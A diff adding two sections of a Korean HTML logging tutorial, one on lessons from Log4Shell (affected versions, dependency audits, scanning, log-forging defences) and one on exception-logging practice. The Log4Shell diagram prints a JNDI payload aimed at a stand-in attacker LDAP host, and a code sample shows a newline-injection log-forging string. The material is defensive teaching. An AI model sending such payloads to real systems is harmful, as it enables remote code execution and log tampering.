@@ -1,0 +1,463 @@
+
+
+
+<!-- ==================== lg11 ==================== -->
+<section class="sec" id="lg11">
+  <div class="sec-head rv">
+    <span class="no">LOG 11</span>
+    <h2>Log4Shell 의 교훈 — <span class="t">로거가 공격 통로</span>가 되던 날</h2>
+    <p class="lead">
+      2021년 12월, <b>로그 한 줄이 원격 코드 실행</b>이 됐습니다. 원인은 어려운 버그가 아니라
+      <b>"로그 메시지를 데이터가 아니라 명령으로 해석했다"</b>는 설계였습니다.
+      이 절은 그때 무슨 일이 있었는지보다 <b>지금 내 프로젝트에서 무엇을 확인해야 하는지</b>에 초점을 둡니다.
+    </p>
+  </div>
+
+  <div class="diag rv">
+    <svg viewBox="0 0 680 236" role="img" aria-label="Log4Shell 공격 한 줄의 해부도. HTTP 요청의 User-Agent 헤더에 달러 중괄호 jndi 콜론 ldap 주소가 들어 있고, 개발자는 이 헤더를 log.info 로 그냥 찍었을 뿐이다. 취약한 Log4j2 는 메시지 안의 달러 중괄호를 발견하면 Lookup 을 실행하고, jndi 플러그인이 공격자의 LDAP 서버에 접속해 참조를 받아 원격 클래스를 로드하고 실행한다. Lookup 문법은 원래 설정 파일용이었으며, 2.16 부터는 메시지 안의 Lookup 자체가 사라지고 JNDI 는 기본으로 꺼졌다. Logback 은 메시지에 Lookup 이 없어 이 취약점이 없다">
+      <text x="16" y="18" class="lbl">Log4Shell 해부 — 로그 한 줄이 원격 코드 실행이 되기까지</text>
+
+      <rect class="bx" x="130" y="32" width="420" height="118"/>
+      <rect class="hl" x="207" y="64" width="192" height="18"/>
+
+      <text x="146" y="54" class="tk">GET /api/orders HTTP/1.1</text>
+      <text x="146" y="76" class="tk">User-Agent: ${jndi:ldap://evil.example.net/a}</text>
+      <text x="146" y="98" class="tk">log.info("ua={}", request.getHeader("User-Agent"));</text>
+      <text x="146" y="120" class="tk">Log4j2 가 메시지 안의 ${...} 를 발견 → Lookup 실행</text>
+      <text x="146" y="142" class="tk rs-t">JNDI → LDAP 접속 → 참조 수신 → 클래스 로드 → 실행</text>
+
+      <path class="lead-ln" d="M554 76 L586 76"/>
+      <text x="592" y="72" class="ann">공격자가 넣은 입력</text>
+      <text x="592" y="84" class="ann">헤더 · 폼 · 쿼리</text>
+
+      <path class="lead-ln" d="M554 120 L586 120"/>
+      <text x="592" y="116" class="ann am-t">여기가 버그 —</text>
+      <text x="592" y="128" class="ann am-t">데이터를 명령으로</text>
+
+      <path class="lead-ln" d="M554 142 L586 142"/>
+      <text x="592" y="138" class="ann rs-t">결과 — RCE</text>
+      <text x="592" y="150" class="ann rs-t">원격 코드 실행</text>
+
+      <path class="lead-ln" d="M126 76 L96 76 L96 160"/>
+      <text x="16" y="172" class="ann">Lookup 문법 — 원래는 설정 파일용</text>
+      <text x="16" y="190" class="ann am-t">고친 뒤 — 2.16 부터 메시지 안의 Lookup 자체가 사라졌고 JNDI 는 기본 꺼짐입니다</text>
+
+      <text x="16" y="210" class="lbl">로그 메시지는 데이터입니다 — 데이터를 해석하는 기능이 로거 안에 있었던 것이 뿌리</text>
+      <text x="16" y="226" class="lbl">Logback 은 메시지에 Lookup 이 없어 이 취약점이 없습니다 — 구조가 곧 보안입니다</text>
+    </svg>
+    <div class="cap">해부도 — <b>노란 칸이 공격자가 쓴 전부</b>입니다. 나머지는 로거가 알아서 해 줬습니다.</div>
+  </div>
+
+  <div class="grid2 rv">
+    <div class="card">
+      <h4 class="mini" style="margin-top:0">무슨 일이었나 — 5분 요약</h4>
+      <div class="tw"><table class="cheat" style="margin:0">
+        <tr><th style="width:30%">항목</th><th>내용</th></tr>
+        <tr><td>식별자</td><td><b>CVE-2021-44228</b> · CVSS 10.0 (최고 등급)</td></tr>
+        <tr><td>영향 범위</td><td><code>log4j-core</code> <b>2.0-beta9 ~ 2.14.1</b></td></tr>
+        <tr><td>조건</td><td>공격자가 넣은 문자열이 <b>로그 메시지에 들어가기만</b> 하면</td></tr>
+        <tr><td>2.15.0</td><td>JNDI 를 localhost 로 제한 — <b>불완전</b></td></tr>
+        <tr><td><b>2.16.0</b></td><td><b>메시지 Lookup 제거 · JNDI 기본 꺼짐</b></td></tr>
+        <tr><td>2.17.0 · 2.17.1</td><td>재귀 DoS · JDBC appender 구멍까지 마감</td></tr>
+        <tr><td>Java 8 이하</td><td>2.12.4 (Java 7) · 2.3.2 (Java 6) 별도 패치</td></tr>
+        <tr><td>Logback</td><td><b>해당 없음</b> — 메시지에 Lookup 이 없음</td></tr>
+        <tr><td>Log4j 1.x</td><td><code>JMSAppender</code> 를 설정했을 때만 (CVE-2021-4104)</td></tr>
+      </table></div>
+      <div class="note info" style="margin-bottom:0">
+        <b>Spring Boot 기본 구성은 안전했습니다</b> —
+        <code>spring-boot-starter-logging</code> 에는 <code>log4j-api</code> 와
+        <code>log4j-to-slf4j</code> 만 있고 <b><code>log4j-core</code> 가 없습니다</b>.
+        취약한 건 <b>core</b> 뿐입니다. 그런데 <b>다른 라이브러리가 core 를 끌고 오는 경우</b>가 문제였습니다 —
+        그래서 "우리는 Logback 쓰니까 괜찮아"가 틀린 팀이 많았습니다.
+      </div>
+    </div>
+    <div class="card">
+      <h4 class="mini" style="margin-top:0">지금 내 프로젝트부터 — 10분 점검</h4>
+      <pre class="code" data-lang="bash"><code># ① core 가 어디서든 들어와 있는지 (Gradle)
+./gradlew dependencyInsight --dependency log4j-core --configuration runtimeClasspath
+#   "No dependencies matching" 이면 없는 것 — 끝
+#   나오면 '누가 끌고 왔는지' 경로가 같이 찍힙니다 ★
+
+# ② Maven
+mvn dependency:tree -Dincludes=org.apache.logging.log4j:log4j-core
+
+# ③ 빌드된 산출물(fat jar · 도커 이미지)에서 직접 확인 — 가장 확실
+unzip -l build/libs/app.jar | grep -i "log4j-core"
+#   중첩 jar(BOOT-INF/lib) 안까지 봐야 합니다
+
+# ④ 취약한 클래스가 실제로 있는지 (버전 표기를 못 믿을 때)
+unzip -l log4j-core-2.14.1.jar | grep JndiLookup
+#   org/apache/logging/log4j/core/lookup/JndiLookup.class  ← 있으면 취약
+
+# ⑤ 운영 중인 JVM 에서 (재시작 없이)
+jcmd &lt;pid&gt; VM.class_hierarchy | grep -i JndiLookup</code></pre>
+      <pre class="code" data-lang="kotlin"><code>// build.gradle.kts — 전이 의존성으로 들어온 core 의 버전을 강제로 올리기
+dependencies {
+    constraints {
+        implementation("org.apache.logging.log4j:log4j-core:2.25.1") {
+            because("CVE-2021-44228 — 2.17.1 미만 금지. 최신은 mvnrepository 확인")
+        }
+    }
+}
+
+// Spring Boot 프로젝트면 부트가 버전을 관리하므로 이 한 줄이 더 간단합니다
+ext["log4j2.version"] = "2.25.1"</code></pre>
+      <div class="note warn" style="margin-bottom:0">
+        <b>버전 강제는 임시 조치입니다</b> — 다음에 그 라이브러리를 올리면
+        <b>또 낡은 core 가 딸려 올 수 있습니다</b>.
+        정답은 <b>①에서 나온 "누가 끌고 왔나"를 찾아 그 라이브러리를 올리거나 exclude</b> 하는 것입니다(LOG 04).
+      </div>
+    </div>
+  </div>
+
+  <h3 class="sub" data-lv="a">실무에선 이렇게 — <span class="t">다음 Log4Shell 을 대비하는 구조</span> <span class="lvl h">🔴 실무</span></h3>
+
+  <div class="diag rv">
+    <svg viewBox="0 0 680 266" role="img" aria-label="의존성 취약점 대응 순환. 목록 단계에서 SBOM 으로 무엇이 들어 있는지 만들고, 스캔 단계에서 취약점 데이터베이스와 대조하며, 패치 단계에서 버전을 강제로 올리거나 라이브러리를 교체하고, 검증 단계에서 다시 스캔하고 기동 로그를 확인한 뒤 다시 목록으로 돌아온다. 가운데에는 이 순환이 매 빌드마다 자동으로 돈다고 적혀 있다. Log4Shell 때 가장 빨랐던 팀은 SBOM 이 이미 있던 팀이었다">
+      <text x="16" y="18" class="lbl">한 바퀴가 자동이면 다음 CVE 는 뉴스가 아니라 알림으로 옵니다</text>
+
+      <circle class="nd nd-fw" cx="340" cy="70" r="42"/>
+      <text x="340" y="68" class="ann" text-anchor="middle">목록 (SBOM)</text>
+      <text x="340" y="82" class="ann" text-anchor="middle">무엇이 들어 있나</text>
+
+      <circle class="nd" cx="500" cy="150" r="42"/>
+      <text x="500" y="148" class="ann" text-anchor="middle">스캔</text>
+      <text x="500" y="162" class="ann" text-anchor="middle">CVE DB 대조</text>
+
+      <circle class="nd" cx="340" cy="230" r="42"/>
+      <text x="340" y="228" class="ann" text-anchor="middle">패치</text>
+      <text x="340" y="242" class="ann" text-anchor="middle">강제 버전 올림</text>
+
+      <circle class="nd nd-ok" cx="180" cy="150" r="42"/>
+      <text x="180" y="148" class="ann" text-anchor="middle">검증</text>
+      <text x="180" y="162" class="ann" text-anchor="middle">재스캔 · 기동 확인</text>
+
+      <path class="ln ar" d="M383 88 A 100 100 0 0 1 462 130"/>
+      <path class="ln ar" d="M462 190 A 100 100 0 0 1 383 212"/>
+      <path class="ln ar" d="M297 212 A 100 100 0 0 1 218 190"/>
+      <path class="ln ar" d="M218 110 A 100 100 0 0 1 297 88"/>
+
+      <text x="340" y="146" class="val" text-anchor="middle">매 빌드마다</text>
+      <text x="340" y="162" class="ann" text-anchor="middle">한 바퀴 자동</text>
+
+      <text x="16" y="256" class="lbl">Log4Shell 때 가장 빨랐던 팀은 SBOM 이 이미 있던 팀입니다 — 찾는 데 0분</text>
+    </svg>
+    <div class="cap">순환 — <b>목록이 먼저</b>입니다. 무엇이 들어 있는지 모르면 스캔도 패치도 시작할 수 없습니다.</div>
+  </div>
+
+  <div class="grid2 rv d1">
+    <div class="card">
+      <h4 class="mini" style="margin-top:0">빌드에 스캔을 붙이기</h4>
+      <pre class="code" data-lang="kotlin"><code>// build.gradle.kts — ① SBOM 생성 (CycloneDX)
+plugins {
+    id("org.cyclonedx.bom") version "2.3.1"          // 최신은 플러그인 포털 확인
+    id("org.owasp.dependencycheck") version "12.1.3"  // ② CVE 대조
+}
+
+dependencyCheck {
+    failBuildOnCVSS = 7.0f          // 심각도 7 이상이면 빌드 실패 ★
+    suppressionFile = "config/dependency-check-suppress.xml"
+}
+// ./gradlew cyclonedxBom dependencyCheckAnalyze</code></pre>
+      <pre class="code" data-lang="yaml"><code># .github/dependabot.yml — ③ 새 버전이 나오면 PR 이 자동으로 옵니다
+version: 2
+updates:
+  - package-ecosystem: "gradle"
+    directory: "/"
+    schedule:
+      interval: "weekly"
+    groups:
+      logging:                       # 로깅 관련은 한 PR 로 묶기
+        patterns: ["org.apache.logging.log4j:*", "ch.qos.logback:*", "org.slf4j:*"]</code></pre>
+      <pre class="code" data-lang="bash"><code># ④ 도커 이미지째로 스캔 — 실제로 배포되는 것을 보는 가장 정직한 방법
+trivy image --severity HIGH,CRITICAL myregistry/order-api:1.4.2
+# 또는 파일 시스템
+trivy fs --scanners vuln .</code></pre>
+      <div class="note tip" style="margin-bottom:0">
+        <b>넷 중 하나만 고른다면 ④</b> — 빌드 스크립트가 아니라
+        <b>배포되는 산출물</b>을 보기 때문입니다. 베이스 이미지에 깔린 JDK · OS 패키지의 구멍까지 같이 잡힙니다.
+        스캔 결과의 <b>거짓 양성</b>은 <code>suppression</code> 파일로 사유를 적어 두고 넘깁니다 — 조용히 끄지 마세요.
+      </div>
+    </div>
+    <div class="card">
+      <h4 class="mini" style="margin-top:0">로그 자체를 공격면으로 보기</h4>
+      <pre class="code" data-lang="java"><code>// ① 로그 위조(log forging) — 줄바꿈으로 가짜 줄을 끼워 넣습니다
+String user = req.getParameter("user");
+// user = "alice\n2026-09-01 10:22:41 INFO  login ok user=admin"
+log.info("login fail user={}", user);
+//   → 두 번째 줄이 '진짜 로그'처럼 보입니다 ★
+
+// 해결 A — 텍스트 패턴에서 개행을 지우기 (Logback)
+//   %replace(%msg){'[\r\n]+', ' '}
+// 해결 B — Log4j2 는 인코더 변환이 있습니다
+//   %enc{%m}{CRLF}
+// 해결 C — JSON 인코더를 쓰면 문자열이 이스케이프되어 자동으로 막힙니다 ★
+
+// ② 외부 입력을 '메시지'가 아니라 '인자'로만 넘기기
+log.info(userInput);                 // ❌ 메시지 자리에 입력 — 절대 금지
+log.info("input={}", userInput);     // ✅ 인자 자리 — 포맷 해석 대상이 아님
+
+// ③ 크기 제한 — 10MB 짜리 헤더를 그대로 찍으면 그게 DoS 입니다
+log.info("ua={}", abbreviate(ua, 200));</code></pre>
+      <div class="tw"><table class="cheat" style="margin:0">
+        <tr><th style="width:40%">교훈</th><th>구체적으로</th></tr>
+        <tr><td><b>메시지는 데이터</b></td><td>입력은 인자 자리에만 · JSON 인코더</td></tr>
+        <tr><td><b>전이 의존성을 안다</b></td><td>SBOM · <code>dependencyInsight</code></td></tr>
+        <tr><td><b>산출물을 스캔</b></td><td>이미지 스캔이 빌드 스캔보다 정직</td></tr>
+        <tr><td><b>패치 경로를 미리</b></td><td><code>constraints</code> 한 줄로 올릴 수 있게</td></tr>
+        <tr><td><b>로거도 아웃바운드</b></td><td>앱 서버의 <b>바깥 방향 네트워크 차단</b></td></tr>
+      </table></div>
+      <div class="note warn" style="margin-bottom:0">
+        <b>마지막 줄이 실제로 피해를 갈랐습니다</b> — Log4Shell 은 로거가 <b>바깥 LDAP 서버로 접속</b>해야 성립합니다.
+        <b>앱 서버의 아웃바운드를 화이트리스트로 막아 둔 팀</b>은 취약한 버전을 쓰고도 뚫리지 않았습니다.
+        로거는 네트워크를 쓰지 않는다는 가정을 버리세요 — 소켓 appender · 수집기 전송 전부 아웃바운드입니다.
+      </div>
+    </div>
+  </div>
+
+  <div class="note info rv">
+    <b>왜 이런 기능이 있었나</b> — <code>${env:HOSTNAME}</code> · <code>${sys:user.dir}</code> 같은 Lookup 은
+    <b>설정 파일</b>(<code>log4j2.xml</code>)에서 경로나 호스트명을 끼워 넣으려고 만든 것입니다.
+    문제는 그 해석이 <b>메시지 문자열에도 적용</b>됐다는 점, 그리고 JNDI 라는 <b>"이름으로 아무 객체나 가져오는"</b> 표준 API 가
+    Lookup 목록에 있었다는 점입니다. 둘 다 각각은 합리적이었고, <b>합쳐지자 폭발</b>했습니다.
+    보안 사고는 대개 이렇게 <b>정상 기능 두 개의 교차점</b>에서 납니다.
+  </div>
+</section>
+
+
+<!-- ==================== lg12 ==================== -->
+<section class="sec" id="lg12">
+  <div class="sec-head rv">
+    <span class="no">LOG 12</span>
+    <h2>예외 로깅 — <span class="t">한 곳에서 한 번</span>, 스택은 필요한 만큼만</h2>
+    <p class="lead">
+      예외 로그는 장애 분석의 <b>주식</b>인데, 실무 로그를 열어 보면 <b>같은 스택이 세 번</b> 찍혀 있거나
+      <b>메시지만 있고 스택이 없거나</b>, 스택이 200줄이라 정작 원인 줄을 못 찾습니다.
+      규칙은 셋입니다 — <b>어디서 잡나 · 무엇을 남기나 · 얼마나 남기나</b>.
+    </p>
+  </div>
+
+  <div class="diag rv">
+    <svg viewBox="0 0 680 252" role="img" aria-label="예외 종류에 따라 로그를 어떻게 남길지 정하는 결정 트리. 예외는 RestControllerAdvice 한 곳까지 올라오고, 거기서 네 갈래로 나뉜다. 클라이언트 잘못인 400 404 422 는 WARN 으로 스택 없이 한 줄, 잔액 부족 같은 비즈니스 규칙 위반은 INFO 로 코드만, NPE 나 DB 장애 같은 우리 잘못 5xx 는 ERROR 로 스택 전체와 traceId, 예상 못 한 나머지 예외는 ERROR 로 스택 전체와 알림이다. 레이어마다 잡아서 찍으면 같은 스택이 세 번 남으므로 잡는 곳은 한 곳, 찍는 것도 한 번이어야 한다">
+      <text x="16" y="18" class="lbl">예외는 한 곳까지 올려 보내고, 거기서 종류별로 다르게 남깁니다</text>
+
+      <rect class="bx" x="200" y="32" width="280" height="32"/>
+      <text x="340" y="53" class="val" text-anchor="middle">@RestControllerAdvice 한 곳</text>
+
+      <path class="ln" d="M340 66 L340 82"/>
+      <path class="ln" d="M100 82 L580 82"/>
+      <path class="ln" d="M100 82 L100 98"/>
+      <path class="ln" d="M260 82 L260 98"/>
+      <path class="ln" d="M420 82 L420 98"/>
+      <path class="ln" d="M580 82 L580 98"/>
+
+      <rect class="bx" x="30" y="100" width="140" height="44"/>
+      <text x="100" y="120" class="val" text-anchor="middle">클라이언트 잘못</text>
+      <text x="100" y="135" class="ann" text-anchor="middle">400 · 404 · 422</text>
+
+      <rect class="bx" x="190" y="100" width="140" height="44"/>
+      <text x="260" y="120" class="val" text-anchor="middle">규칙 위반</text>
+      <text x="260" y="135" class="ann" text-anchor="middle">잔액 부족 · 중복 주문</text>
+
+      <rect class="bx bx-fw" x="350" y="100" width="140" height="44"/>
+      <text x="420" y="120" class="val" text-anchor="middle">우리 잘못 (5xx)</text>
+      <text x="420" y="135" class="ann" text-anchor="middle">NPE · DB 장애 · 타임아웃</text>
+
+      <rect class="bx" x="510" y="100" width="140" height="44"/>
+      <text x="580" y="120" class="val" text-anchor="middle">예상 못 한 것</text>
+      <text x="580" y="135" class="ann" text-anchor="middle">그 밖의 모든 예외</text>
+
+      <path class="ln ar" d="M100 148 L100 160"/>
+      <path class="ln ar" d="M260 148 L260 160"/>
+      <path class="ln ar" d="M420 148 L420 160"/>
+      <path class="ln ar" d="M580 148 L580 160"/>
+
+      <rect class="bx bx-mut" x="30" y="164" width="140" height="40"/>
+      <text x="100" y="181" class="ann" text-anchor="middle">WARN · 스택 없음</text>
+      <text x="100" y="195" class="ann" text-anchor="middle">한 줄 · 알림 없음</text>
+
+      <rect class="bx bx-mut" x="190" y="164" width="140" height="40"/>
+      <text x="260" y="181" class="ann" text-anchor="middle">INFO · 코드만</text>
+      <text x="260" y="195" class="ann" text-anchor="middle">지표로 세는 대상</text>
+
+      <rect class="bx bx-ok" x="350" y="164" width="140" height="40"/>
+      <text x="420" y="181" class="ann ok-t" text-anchor="middle">ERROR · 스택 전체</text>
+      <text x="420" y="195" class="ann ok-t" text-anchor="middle">traceId · 알림</text>
+
+      <rect class="bx bx-ok" x="510" y="164" width="140" height="40"/>
+      <text x="580" y="181" class="ann ok-t" text-anchor="middle">ERROR · 스택 전체</text>
+      <text x="580" y="195" class="ann ok-t" text-anchor="middle">알림 · 새 분기 후보</text>
+
+      <text x="16" y="226" class="lbl">레이어마다 잡아서 찍으면 같은 스택이 세 번 남습니다 — 잡는 곳은 한 곳, 찍는 것도 한 번</text>
+      <text x="16" y="242" class="lbl">4xx 에 스택을 붙이면 ERROR 알림이 남의 실수로 가득 찹니다 — 진짜 장애가 묻힙니다</text>
+    </svg>
+    <div class="cap">트리 — <b>붉은 칸만 ERROR</b>입니다. 나머지 셋을 ERROR 로 찍는 순간 알림 채널이 죽습니다.</div>
+  </div>
+
+  <div class="grid2 rv">
+    <div class="card">
+      <h4 class="mini" style="margin-top:0">기본기 — 스택이 사라지는 다섯 가지 방법</h4>
+      <pre class="code" data-lang="java"><code>// ✅ 유일한 정답 — 예외를 '마지막 인자'로
+log.error("order.pay.fail orderId={}", orderId, e);
+
+// ❌ ① 메시지만 — 어디서 났는지 영원히 모릅니다
+log.error("결제 실패: " + e.getMessage());
+
+// ❌ ② toString — 첫 줄만 남고 스택은 없음
+log.error("결제 실패 {}", e.toString());
+
+// ❌ ③ printStackTrace — 로거를 안 거쳐 파일·수집기에 안 남음
+e.printStackTrace();
+
+// ❌ ④ 삼키기 — 가장 나쁨. 나중에 '왜 null 이지?' 로 돌아옵니다
+try { ... } catch (Exception e) { }
+
+// ⚠️ ⑤ {} 를 예외 자리에 쓰기 — SLF4J 는 마지막 Throwable 을 따로 뺍니다
+log.error("결제 실패 {}", e);
+//   출력: "결제 실패 {}" + 스택트레이스  ← {} 가 글자 그대로 남습니다
+//   스택은 나오니 '틀린' 건 아니지만, 의도를 오해한 코드입니다</code></pre>
+      <div class="note tip" style="margin-bottom:0">
+        <b>메시지에는 "무엇을 하다가"를, 예외에는 "왜"를</b> —
+        <code>e.getMessage()</code> 는 라이브러리가 쓴 문장이라 <b>내 맥락(orderId · userId)이 없습니다</b>.
+        메시지 자리에 <b>내 맥락</b>을, 마지막 인자에 <b>예외 객체</b>를 두면 둘 다 남습니다.
+      </div>
+    </div>
+    <div class="card">
+      <h4 class="mini" style="margin-top:0">한 곳에서 한 번 — 잡는 자리 정하기</h4>
+      <pre class="code" data-lang="java"><code>// ❌ 레이어마다 '잡고 → 찍고 → 다시 던지기' — 같은 스택이 세 번
+public Order find(Long id) {
+    try { return repo.findById(id); }
+    catch (DataAccessException e) {
+        log.error("DB 조회 실패", e);      // 1번
+        throw new OrderException(e);       // 위에서 또 찍힘
+    }
+}
+
+// ✅ 잡지 말고 올려 보내기 — 필요하면 '감싸기만' 하고 로그는 안 찍음
+public Order find(Long id) {
+    try { return repo.findById(id); }
+    catch (DataAccessException e) {
+        throw new OrderException("order.find id=" + id, e);   // cause 를 반드시 넘김 ★
+    }
+}
+
+// ✅ 찍는 곳은 한 곳 — 종류별로 레벨과 스택 여부를 정합니다
+@RestControllerAdvice
+public class ApiExceptionHandler {
+
+    @ExceptionHandler(MethodArgumentNotValidException.class)      // 4xx
+    ProblemDetail badRequest(MethodArgumentNotValidException e) {
+        log.warn("api.400 path={} msg={}", path(), e.getMessage());  // 스택 없음
+        return ProblemDetail.forStatus(HttpStatus.BAD_REQUEST);
+    }
+
+    @ExceptionHandler(BusinessException.class)                    // 규칙 위반
+    ProblemDetail business(BusinessException e) {
+        log.info("api.business code={}", e.code());                   // 코드만
+        return ProblemDetail.forStatusAndDetail(HttpStatus.CONFLICT, e.code());
+    }
+
+    @ExceptionHandler(Exception.class)                            // 5xx — 우리 잘못
+    ProblemDetail unexpected(Exception e) {
+        log.error("api.500 path={} traceId={}", path(), MDC.get("traceId"), e);  // 스택 전체
+        return ProblemDetail.forStatus(HttpStatus.INTERNAL_SERVER_ERROR);
+    }
+}</code></pre>
+      <div class="note warn" style="margin-bottom:0">
+        <b>"잡고 다시 던질 때 로그를 찍지 않는다"</b>가 규칙입니다.
+        예외는 <b>그 예외를 최종적으로 처리하는 곳</b>(응답을 만들거나 · 재시도를 포기하거나 · 스레드를 끝내는 곳)에서만 찍습니다.
+        중간 레이어는 <b>맥락을 붙여 감싸기</b>만 하고, <b><code>cause</code> 를 잃지 않게</b> 넘깁니다.
+      </div>
+    </div>
+  </div>
+
+  <h3 class="sub" data-lv="a">실무에선 이렇게 — <span class="t">스택트레이스를 읽을 수 있게 만들기</span> <span class="lvl h">🔴 실무</span></h3>
+  <div class="grid2 rv d1">
+    <div class="card">
+      <h4 class="mini" style="margin-top:0">200줄 스택을 20줄로</h4>
+      <pre class="code" data-lang="xml"><code>&lt;!-- Logback 패턴 — %ex 의 옵션으로 길이와 제외 패키지를 정합니다 --&gt;
+&lt;pattern&gt;%d %-5level %logger{36} - %msg%n%ex{20, sun.reflect, java.lang.reflect,
+  org.springframework.aop, org.springframework.cglib, jdk.internal}&lt;/pattern&gt;
+&lt;!--   %ex{short}  첫 프레임만  ·  %ex{full}  전부  ·  %ex{20}  20줄
+       뒤에 오는 패키지 이름이 들어간 프레임은 건너뜁니다 (Logback 1.1 이후)
+       %rEx  = 원인(Caused by)을 '먼저' 찍습니다 — 진짜 원인이 맨 위로 ★
+       %xEx  = 프레임마다 jar 이름·버전을 붙입니다 — 유용하지만 비쌉니다 --&gt;
+
+&lt;!-- JSON 인코더 (logstash-logback-encoder) 는 더 세밀합니다 --&gt;
+&lt;throwableConverter class="net.logstash.logback.stacktrace.ShortenedThrowableConverter"&gt;
+  &lt;maxDepthPerThrowable&gt;20&lt;/maxDepthPerThrowable&gt;
+  &lt;maxLength&gt;4096&lt;/maxLength&gt;
+  &lt;shortenedClassNameLength&gt;30&lt;/shortenedClassNameLength&gt;
+  &lt;rootCauseFirst&gt;true&lt;/rootCauseFirst&gt;          &lt;!-- 원인부터 --&gt;
+  &lt;inlineHash&gt;true&lt;/inlineHash&gt;                  &lt;!-- 스택 해시 — 같은 오류 묶기 ★ --&gt;
+  &lt;exclude&gt;^sun\.reflect\..*&lt;/exclude&gt;
+  &lt;exclude&gt;^java\.lang\.reflect\..*&lt;/exclude&gt;
+  &lt;exclude&gt;^org\.springframework\.(aop|cglib|web\.filter)\..*&lt;/exclude&gt;
+  &lt;exclude&gt;^jakarta\.servlet\..*&lt;/exclude&gt;
+  &lt;exclude&gt;^org\.apache\.(catalina|coyote|tomcat)\..*&lt;/exclude&gt;
+&lt;/throwableConverter&gt;</code></pre>
+      <pre class="code" data-lang="text"><code>원인부터 찍으면 이렇게 됩니다 (rootCauseFirst)
+
+  java.net.ConnectException: Connection refused        ← 진짜 원인이 첫 줄 ★
+      at c.m.pg.PgClient.call(PgClient.java:88)
+  Wrapped by: c.m.order.PaymentException: order.pay id=1042
+      at c.m.order.PayService.pay(PayService.java:41)
+  Wrapped by: c.m.api.ApiException: api.500
+      at c.m.api.ApiExceptionHandler.unexpected(...)
+
+기본 순서는 반대입니다 — 맨 아래 'Caused by' 까지 스크롤해야 원인이 나옵니다.</code></pre>
+      <div class="note tip" style="margin-bottom:0">
+        <b><code>inlineHash</code> 가 조용히 강력합니다</b> — 스택의 <b>프레임 목록을 해시</b>해서
+        필드로 넣어 주므로, 수집기에서 <b>"같은 오류가 몇 번"</b>을 셀 수 있습니다.
+        메시지에 orderId 가 들어가 매번 문자열이 달라도 <b>해시는 같습니다</b>.
+        Sentry 같은 오류 추적 서비스가 하는 묶기(grouping)를 로그만으로 흉내 내는 방법입니다.
+      </div>
+    </div>
+    <div class="card">
+      <h4 class="mini" style="margin-top:0">스택이 갑자기 비는 이유 · 예외의 비용</h4>
+      <pre class="code" data-lang="text"><code>증상: 운영 며칠 뒤부터 NPE 로그에 스택이 없습니다
+  java.lang.NullPointerException
+  (at ... 줄이 하나도 없음)
+
+원인: JIT 최적화 — OmitStackTraceInFastThrow ★
+  같은 자리에서 NPE · ArrayIndexOutOfBounds · ClassCast ·
+  ArithmeticException 이 '아주 많이' 나면 C2 컴파일러가
+  스택 없는 미리 만든 예외 객체를 재사용합니다.
+
+대책
+  ① 로그를 거슬러 올라가 '처음' 났을 때의 스택을 찾습니다 (그때는 있음)
+  ② 재현하려면  -XX:-OmitStackTraceInFastThrow  로 끕니다
+     (성능 차이는 대개 무시할 수준이지만, 핫 경로에서 예외를 던지는 것 자체가 문제)</code></pre>
+      <pre class="code" data-lang="java"><code>// 예외는 비쌉니다 — 생성 시점에 fillInStackTrace() 가 스택을 통째로 복사합니다
+// 깊이 100 스택 한 번 ≈ 일반 로그 수만 줄에 해당하는 비용 (자릿수 수준의 감)
+
+// 흐름 제어용 예외(재시도 신호 · 조기 종료)는 스택을 만들지 않게 합니다
+public class RetrySignal extends RuntimeException {
+    public RetrySignal(String msg) {
+        super(msg, null, /*enableSuppression*/ false, /*writableStackTrace*/ false);
+    }
+}
+
+// Spring 에서 '가장 안쪽 원인'만 뽑기
+Throwable root = NestedExceptionUtils.getMostSpecificCause(e);
+log.error("api.500 root={} msg={}", root.getClass().getSimpleName(), root.getMessage(), e);</code></pre>
+      <div class="tw"><table class="cheat" style="margin:0">
+        <tr><th style="width:40%">상황</th><th>스택</th></tr>
+        <tr><td>5xx · 예상 못 한 예외</td><td><b>전체</b> (제외 패턴 적용)</td></tr>
+        <tr><td>재시도 후 결국 실패</td><td>마지막 시도만 전체</td></tr>
+        <tr><td>재시도 중간 실패</td><td><code>%ex{short}</code> 한 줄</td></tr>
+        <tr><td>4xx · 검증 실패</td><td><b>없음</b></td></tr>
+        <tr><td>흐름 제어용 예외</td><td>생성조차 안 함</td></tr>
+      </table></div>
+      <div class="note warn" style="margin-bottom:0">
+        <b>텍스트 로그의 스택은 수집기를 깨뜨립니다</b> — 줄 단위로 읽는 수집기는
+        스택 한 줄 한 줄을 <b>별개의 이벤트</b>로 만듭니다. Fluent Bit 의 multiline 파서로 붙일 수도 있지만,
+        <b>JSON 인코더를 쓰면 스택 전체가 <code>error.stack_trace</code> 필드 하나</b>로 들어가 이 문제가 사라집니다(LOG 07).
+      </div>
+    </div>
+  </div>
+
+  <div class="ez mid"><b>정리 —</b> 예외는 <b>마지막 인자</b>로, <b>최종 처리하는 한 곳</b>에서만, <b>4xx 는 스택 없이 · 5xx 는 원인부터</b> 찍습니다. 이 세 줄이면 예외 로그의 사고 대부분이 사라집니다.</div>
+</section>
+
+</div><!-- /pane-log -->
